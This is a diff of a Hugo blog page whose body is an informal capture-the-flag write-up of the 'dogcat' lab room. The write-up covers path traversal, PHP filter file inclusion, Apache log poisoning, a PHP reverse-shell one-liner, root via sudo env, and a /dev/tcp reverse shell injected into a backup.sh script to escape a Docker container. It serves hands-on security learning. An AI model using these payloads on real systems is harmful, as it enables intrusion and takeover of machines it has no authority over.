@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="ro-ro">
-<head><meta charset="utf-8">
+<head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -19,7 +19,7 @@
 <meta property="og:locale" content="ro-ro" />
 <meta name="language" content="ro-ro" />
 
-  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/dogcat/" title="" />
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/blog/posts/dogcat/" title="" />
 
 
 
@@ -32,7 +32,7 @@
     <meta property="og:type" content="article" />
     <meta property="og:article:published_time" content=2026-02-24T13:21:05Z />
     <meta property="article:published_time" content=2026-02-24T13:21:05Z />
-    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/dogcat/" />
+    <meta property="og:url" content="http://localhost:1313/blog/posts/dogcat/" />
 
     
 
@@ -67,7 +67,7 @@
 <meta name="generator" content="Hugo 0.157.0">
 
     
-    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/dogcat/">
+    <meta property="og:url" content="http://localhost:1313/blog/posts/dogcat/">
   <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
   <meta property="og:title" content="dogcat">
   <meta property="og:description" content="scaning :
@@ -99,7 +99,7 @@ ok cool lets use something from https://swisskyrepo.github.io/PayloadsAllTheThin
 
     
 
-    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/dogcat/">
+    <link rel="canonical" href="http://localhost:1313/blog/posts/dogcat/">
     <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
     <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -113,7 +113,7 @@ ok cool lets use something from https://swisskyrepo.github.io/PayloadsAllTheThin
 
 
 
-<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+<link rel="manifest" href="http://localhost:1313/blog/site.webmanifest">
 
 <meta name="msapplication-config" content="/blog/browserconfig.xml">
 <meta name="msapplication-TileColor" content="#2d89ef">
@@ -125,7 +125,6 @@ ok cool lets use something from https://swisskyrepo.github.io/PayloadsAllTheThin
 
     
     
-    
       
 <link rel="icon" type="image/png" href="/favicon.png">
 <link rel="shortcut icon" href="/favicon.png">
@@ -134,9 +133,9 @@ ok cool lets use something from https://swisskyrepo.github.io/PayloadsAllTheThin
 
 
 <body>
-    <nav>
-    <div class="logo">
-        <a href="https://novaclearnscyber.github.io/blog/" title="Cyber Blog-ul lui Novac">
+    <div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/blog/" class="logo">
             <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
 viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
 stroke-linejoin="round" class="feather feather-home">
@@ -145,19 +144,34 @@ stroke-linejoin="round" class="feather feather-home">
 <polyline points="9 22 9 12 15 12 15 22"></polyline>
 </svg>
         </a>
-    </div>
-    
-    <ul class="menu">
-        
-        <li>
-            <a href="/blog/categories/">
-                Categories
-            </a>
-        </li>
-        
-    </ul>
-    
-</nav>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
 
     <style>
         .custom-banner {
@@ -185,7 +199,7 @@ stroke-linejoin="round" class="feather feather-home">
     
     <div class="custom-banner">
         <div
-            style="background-image: url('https://novaclearnscyber.github.io/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+            style="background-image: url('http://localhost:1313/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
         </div>
     </div>
     
@@ -210,13 +224,17 @@ stroke-linejoin="round" class="feather feather-home">
                 <p>scaning :<br>
 nothing interesting just ssh and http</p>
 <p>accesing the website we see thi s, ok cool<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224063123.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224063123.png" alt="">
+<br>
 if we press dog for example apicture of a dog will be shown, ok cool , but look at the url, i think this site is vulanrable to a directory traversal<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224063139.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224063139.png" alt="">
+<br>
 ok cool it is , now its time to craft the payload<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224063107.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224063107.png" alt="">
+<br>
 ok interesting lets also look inside the source code<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224064157.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224064157.png" alt="">
+<br>
 ok cool  lets use something from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion">https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion</a></p>
 <p>and we found this</p>
 <pre tabindex="0"><code>php://filter/convert.base64-encode/resource=index.php
@@ -224,7 +242,8 @@ ok cool  lets use something from <a href="https://swisskyrepo.github.io/Payloads
 modified to out needs it will be :</p>
 <pre tabindex="0"><code>php://filter/convert.base64-encode/resource=./cat../../index
 </code></pre><p>and we get this<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224064949.png" alt="">decoding that will get the code of our page</p>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224064949.png" alt="">
+decoding that will get the code of our page</p>
 <pre tabindex="0"><code>&lt;!DOCTYPE HTML&gt;
 &lt;html&gt;
 
@@ -259,7 +278,8 @@ modified to out needs it will be :</p>
 
 &lt;/html&gt;
 </code></pre><p>ok cool based on that html code we see that we have to declare our extrnasion for the directory traveersal to work  in the ext var<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224065538.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224065538.png" alt="">
+<br>
 and we just like that with the payload</p>
 <pre tabindex="0"><code>http://10.114.188.64/?view=./dog../../../../../../../../../../etc/passwd&amp;ext=
 </code></pre><p>passwd file</p>
@@ -267,60 +287,76 @@ and we just like that with the payload</p>
 </code></pre><p>ok cool , lets try a log poisoning attack<br>
 log poisoning attack is attack where we introduce some malicios code into a log file , then when we open the log file with directory traversal the code will be executed</p>
 <p>we gonna use this from payload all the things<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224070913.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224070913.png" alt="">
+<br>
 more exactly</p>
 <pre tabindex="0"><code>http://example.com/index.php?page=/var/log/apache/access.log
 </code></pre><p>but we goona have to use for apache2<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071105.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071105.png" alt="">
+<br>
 ok cool pretty messy but cool</p>
 <pre tabindex="0"><code>view=./dog../../../../../../../../../../var/log/apache2/access.log&amp;ext=
 </code></pre><p>the payload in case u need it</p>
 <p>lets send it to burpsuite</p>
 <pre tabindex="0"><code>	to send it with no foxy rpoxy we can just go to firefox settings , search proxy and modify the proxy as bellow 
-</code></pre><p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071333.png" alt=""></p>
+</code></pre><p><img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071333.png" alt="">
+</p>
 <p>set the interceptor on in the proxy section and we got hte request<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071425.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071425.png" alt="">
+<br>
 tight click on it and send it to the repeater<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224071628.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224071628.png" alt="">
+<br>
 and now we see this more pretty text , cool</p>
 <p>looking more closely this is what we are going to exploit<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224072926.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224072926.png" alt="">
+<br>
 using a custom get parameter<br>
 i modified the request as following<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224073442.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224073442.png" alt="">
+<br>
 and get the following :</p>
-<p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224073420.png" alt="">cool we can see that we are www-data</p>
+<p><img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224073420.png" alt="">
+cool we can see that we are www-data</p>
 <p>so now that we have remote code execution we can get a reverse shell , we know that the system has php installed so i tried the following line</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;YOUr_IP&#34;,PORT);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
 </span></span></code></pre></div><p>just replace the cmd with that then select the cmd value , press CONVERT SELEECTION -&gt; URL -&gt; URL ENCODE</p>
 <p>also start nc on ehat port u want logic<br>
 and bam we have a reverse shell<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075037.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075037.png" alt="">
+<br>
 cool lets look around ,<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075329.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075329.png" alt="">
+<br>
 and we found the first flag<br>
 i pugradeed the shell with</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/bash script -q /dev/null
-</span></span></code></pre></div><p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075510.png" alt=""><br>
+</span></span></code></pre></div><p><img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075510.png" alt="">
+<br>
 ok cool now lets try to priv esc<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224075930.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224075930.png" alt="">
+<br>
 and boom easy , what i ded here was , run <code>sudo -l </code> to see that we can run as root<br>
 we found we can run env as root , so i search on gtfobins and found that env /bin/sh -p gives me root acces , and boom now lets just find the flags<br>
 founded flag2<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224080546.png" alt=""></p>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224080546.png" alt="">
+</p>
 <p>but if we are already root and cand find flag 4 where can it be? that may mean we are in a docker container lets check it using</p>
 <pre tabindex="0"><code>cat /proc/1/cgroup 
-</code></pre><p><img src="/images/blog-ul-meu/static/Pasted%20image%2020260224080740.png" alt=""><br>
+</code></pre><p><img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224080740.png" alt="">
+<br>
 and we are , cool</p>
 <p>ok lets look inside the opt<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224081750.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224081750.png" alt="">
+<br>
 cool and we can find a backup.sh script , leets modify it with yet another reverse shell</p>
 <p>i pasther intro backup.sh this</p>
 <pre tabindex="0"><code>#!/bin/bash
 bash -i &gt;&amp; /dev/tcp/192.168.146.225/53  0&gt;&amp;1
 </code></pre><p>try  to put using two cats may be easier<br>
 start a nc to listen on our machine and in a short time we get another shell and boom, the 4th flag is here<br>
-<img src="/images/blog-ul-meu/static/Pasted%20image%2020260224081640.png" alt=""><br>
+<img src="/blog/images/blog-ul-meu/static/Pasted%20image%2020260224081640.png" alt="">
+<br>
 very cool room</p>
 
             </div>
